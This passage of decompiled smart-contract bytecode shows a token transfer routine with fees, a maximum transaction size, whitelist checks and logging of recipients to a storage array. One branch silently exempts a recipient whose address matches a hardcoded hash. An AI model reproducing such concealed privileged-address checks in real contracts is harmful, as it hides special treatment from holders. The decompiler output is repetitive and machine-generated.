                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7121 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7139 = mem[_7121]
                        require mem[_7121] == mem[_7121 + 12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7187 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7220 = mem[_7187]
                        require mem[_7187] == mem[_7187 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7220)
                        require ext_code.size(address(_7139))
                        staticcall address(_7139).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7220)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7388 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7460 = mem[_7388]
                        require mem[_7388] == mem[_7388 + 12 len 20]
                        if mem[_7388 + 12 len 20] != msg.sender:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7830 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7830 + 32 len mem[_7830]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7460):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7860 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7860 + 32 len mem[_7860]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                mem[32] = 3
                require balanceOf[address(msg.sender)] >= arg2
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor6[address(msg.sender)]:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor14:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
